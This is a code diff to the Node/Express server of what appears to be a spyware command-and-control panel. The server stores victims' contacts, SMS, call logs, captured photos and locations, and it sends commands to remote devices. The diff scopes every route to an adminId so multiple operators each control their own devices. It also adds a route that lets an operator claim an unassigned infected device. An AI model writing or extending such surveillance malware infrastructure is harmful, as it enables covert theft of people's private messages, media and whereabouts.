@@ -47,6 +47,7 @@ mongoose.connect(process.env.MONGODB_URI, {
 const DeviceSchema = new mongoose.Schema({
   deviceId: { type: String, unique: true, required: true },
   alias: String,
+  adminId: { type: String, index: true }, // Link device to admin who created it
   status: { type: String, default: 'offline', enum: ['online', 'offline', 'sleeping'] },
   ip: String,
   country: String,
@@ -548,7 +549,8 @@ app.post('/api/auth/register', async (req, res) => {
 // Devices Routes
 app.get('/api/devices', authMiddleware, async (req, res) => {
   try {
-    const devices = await Device.find().sort({ lastSeen: -1 }).lean();
+    // Show only devices belonging to this admin
+    const devices = await Device.find({ adminId: req.adminId }).sort({ lastSeen: -1 }).lean();
     // Normalize data Map
     devices.forEach(d => {
       if (d.data instanceof Map) d.data = Object.fromEntries(d.data);
@@ -561,7 +563,7 @@ app.get('/api/devices', authMiddleware, async (req, res) => {
 
 app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
   try {
-    const device = await Device.findOne({ deviceId: req.params.deviceId }).lean();
+    const device = await Device.findOne({ deviceId: req.params.deviceId, adminId: req.adminId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     if (device.data instanceof Map) {
       device.data = Object.fromEntries(device.data);
@@ -575,7 +577,7 @@ app.get('/api/devices/:deviceId', authMiddleware, async (req, res) => {
 app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
   try {
     const { type, params } = req.body;
-    const device = await Device.findOne({ deviceId: req.params.deviceId });
+    const device = await Device.findOne({ deviceId: req.params.deviceId, adminId: req.adminId });
     if (!device) return res.status(404).json({ error: 'Device not found' });
     
     const commandId = uuidv4();
@@ -603,7 +605,7 @@ app.get('/api/devices/:deviceId/search/contacts', authMiddleware, async (req, re
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
-    const device = await Device.findOne({ deviceId }).lean();
+    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     let contacts = (device.data?.contacts || []);
     if (q) {
@@ -624,7 +626,7 @@ app.get('/api/devices/:deviceId/search/sms', authMiddleware, async (req, res) =>
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
-    const device = await Device.findOne({ deviceId }).lean();
+    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     let sms = (device.data?.sms || []);
     if (q) {
@@ -645,7 +647,7 @@ app.get('/api/devices/:deviceId/search/callLogs', authMiddleware, async (req, re
   try {
     const { deviceId } = req.params;
     const { q } = req.query;
-    const device = await Device.findOne({ deviceId }).lean();
+    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     let calls = (device.data?.callLogs || []);
     if (q) {
@@ -689,7 +691,7 @@ app.post('/api/upload', authMiddleware, upload.single('file'), async (req, res) 
 // ===== DELETE DEVICE =====
 app.delete('/api/devices/:deviceId', authMiddleware, async (req, res) => {
   try {
-    const device = await Device.findOneAndDelete({ deviceId: req.params.deviceId });
+    const device = await Device.findOneAndDelete({ deviceId: req.params.deviceId, adminId: req.adminId });
     if (!device) return res.status(404).json({ error: 'Device not found' });
     io.emit('device:offline', { deviceId: req.params.deviceId });
     res.json({ success: true, message: 'Device deleted' });
@@ -705,7 +707,7 @@ app.delete('/api/devices/:deviceId/data/:dataType/:itemId', authMiddleware, asyn
     if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations'].includes(dataType)) {
       return res.status(400).json({ error: 'Invalid data type' });
     }
-    const device = await Device.findOne({ deviceId }).lean();
+    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     
     const dataKey = `data.${dataType}`;
@@ -736,7 +738,7 @@ app.delete('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, 
     
     // If capturedPhotos, also delete from Cloudinary
     if (dataType === 'capturedPhotos') {
-      const device = await Device.findOne({ deviceId }).lean();
+      const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
       if (device?.data?.capturedPhotos) {
         const photos = device.data.capturedPhotos instanceof Map 
           ? Array.from(device.data.capturedPhotos.values()) 
@@ -749,14 +751,14 @@ app.delete('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, 
       }
     }
     if (dataType === 'lastPhoto') {
-      const device = await Device.findOne({ deviceId }).lean();
+      const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
       if (device?.data?.lastPhoto?.publicId) {
         try { await cloudinary.uploader.destroy(device.data.lastPhoto.publicId); } catch (e) {}
       }
     }
     
     const result = await mongoose.connection.db.collection('devices').updateOne(
-      { deviceId },
+      { deviceId, adminId: req.adminId },
       { $unset: { [`data.${dataType}`]: '' } }
     );
     
@@ -774,7 +776,7 @@ app.delete('/api/media/:deviceId/:type', authMiddleware, async (req, res) => {
     
     if (!publicId) {
       // Delete all media of this type for device
-      const device = await Device.findOne({ deviceId }).lean();
+      const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
       if (!device) return res.status(404).json({ error: 'Device not found' });
       
       const dataField = type === 'photos' || type === 'capturedPhotos' ? 'capturedPhotos' : 
@@ -798,10 +800,11 @@ app.delete('/api/media/:deviceId/:type', authMiddleware, async (req, res) => {
       await Promise.all(deletePromises);
       
       // Clear from DB
-      await Device.updateOne(
-        { deviceId },
+      const updateResult = await Device.updateOne(
+        { deviceId, adminId: req.adminId },
         { $set: { [`data.${dataField}`]: [] } }
       );
+      if (updateResult.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
       
       res.json({ success: true, deleted: items.length });
     } else {
@@ -816,14 +819,30 @@ app.delete('/api/media/:deviceId/:type', authMiddleware, async (req, res) => {
                         type === 'documents' ? 'documents' : null;
       
       if (dataField) {
-        await Device.updateOne(
-          { deviceId },
+        const updateResult2 = await Device.updateOne(
+          { deviceId, adminId: req.adminId },
           { $pull: { [`data.${dataField}`]: { publicId } } }
         );
+        if (updateResult2.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
       }
       
       res.json({ success: true });
     }
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Device assignment: admin claims an unassigned device
+app.post('/api/devices/:deviceId/assign', authMiddleware, async (req, res) => {
+  try {
+    const device = await Device.findOneAndUpdate(
+      { deviceId: req.params.deviceId, adminId: { $in: [null, { $exists: false }] } },
+      { $set: { adminId: req.adminId } },
+      { new: true }
+    );
+    if (!device) return res.status(404).json({ error: 'Device not found or already assigned' });
+    res.json({ success: true, device });
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -839,10 +858,11 @@ app.delete('/api/media/:deviceId/:type/:publicId', authMiddleware, async (req, r
     } catch (e) {}
     
     const dataField = 'capturedPhotos';
-    await Device.updateOne(
-      { deviceId: req.params.deviceId },
+    const updateResult3 = await Device.updateOne(
+      { deviceId: req.params.deviceId, adminId: req.adminId },
       { $pull: { [`data.${dataField}`]: { publicId } } }
     );
+    if (updateResult3.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
     
     res.json({ success: true });
   } catch (err) {
@@ -1060,7 +1080,7 @@ app.get('/api/stats', authMiddleware, async (req, res) => {
 app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
   try {
     const { deviceId, dataType } = req.params;
-    const device = await Device.findOne({ deviceId }).lean();
+    const device = await Device.findOne({ deviceId, adminId: req.adminId }).lean();
     if (!device) return res.status(404).json({ error: 'Device not found' });
     const data = device.data || {};
     if (data instanceof Map) {
